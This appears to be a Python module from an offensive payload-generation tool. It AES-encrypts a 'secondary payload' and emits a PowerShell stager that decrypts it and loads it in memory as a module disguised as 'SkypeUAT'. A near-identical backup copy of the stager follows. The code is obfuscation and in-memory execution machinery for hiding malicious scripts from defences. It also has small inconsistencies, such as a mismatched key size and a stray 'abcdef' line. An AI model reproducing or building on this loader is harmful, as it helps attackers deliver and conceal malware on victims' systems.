from Crypto.Cipher import AES
import json
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

class PayloadEncryption():
    # TODO: The remaining client-side code should be bundled in here before finalising the 0.5.6 release

    def payload_encryption(self, raw_payload):
        encrypted_payload = self.encrypt_with_static_aes(raw_payload)
        finalised_payload  = self.payload_decryption_wrapper(encrypted_payload)
        return finalised_payload

    def encrypt_with_static_aes(self, payload):
        # Responsible for encrypting the secondary payload using a static key.
        # Returns a dict with IV, Ciphertext and Key, all as base64 values.
        # These can then be inserted into the client-side decryption routine.
        key = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
        iv = b64encode(cipher.iv).decode('utf-8')
        ct = b64encode(ct_bytes).decode('utf-8')
        key = b64encode(key).decode('utf-8')
        result = {'key': key, 'iv': iv, 'ciphertext': ct}
        return result


    def payload_decryption_wrapper(self, encrypted_payload):
        try:
            powershell_decryption = f'''
function Create-AesManagedObject($key, $IV) {{
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {{
        if ($IV.getType().Name -eq "String") {{
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }}
        else {{
            $aesManaged.IV = $IV
        }}
    }}
    if ($key) {{
        if ($key.getType().Name -eq "String") {{
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }}
        else {{
            $aesManaged.Key = $key
        }}
    }}
    $aesManaged
}}

function dcc($key, $iv, $ct){{
    $byte_ct = [System.Convert]::FromBase64String($ct)
    $bytes = [System.Convert]::FromBase64String($ct)
    $aesManaged = Create-AesManagedObject $key $iv
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $aesManaged.Dispose()
    $script:payload = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
}}
$key = "{encrypted_payload['key']}" 
$ct = "{encrypted_payload['ciphertext']}"
$iv = "{encrypted_payload['iv']}"
$ggwp = dcc $key $iv $ct

start-sleep 1
$aa = [ScriptBlock]::Create($script:payload)
New-Module -ScriptBlock $aa -Name "SkypeUAT" | Import-Module | out-null

abcdef     
            '''
            return powershell_decryption
        except:
            return

    def BACKUP_payload_decryption_wrapper(self, encrypted_payload):
            try:
                powershell_decryption = f'''
function Create-AesManagedObject($key, $IV) {{
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {{
        if ($IV.getType().Name -eq "String") {{
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }}
        else {{
            $aesManaged.IV = $IV
        }}
    }}
    if ($key) {{
        if ($key.getType().Name -eq "String") {{
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }}
        else {{
            $aesManaged.Key = $key
        }}
    }}
    $aesManaged
}}

function dcc($key, $iv, $ct){{
    $byte_ct = [System.Convert]::FromBase64String($ct)
    $bytes = [System.Convert]::FromBase64String($ct)
    $aesManaged = Create-AesManagedObject $key $iv
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $aesManaged.Dispose();
    $script:payload = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
}}
$key = "{encrypted_payload['key']}" 
$ct = "{encrypted_payload['ciphertext']}"
$iv = "{encrypted_payload['iv']}"
$ggwp = dcc $key $iv $ct

start-sleep 1
$aa = [ScriptBlock]::Create($script:payload)
New-Module -ScriptBlock $aa -Name "SkypeUAT" | Import-Module | out-null

abcdef
'''
                return powershell_decryption
            except:
                return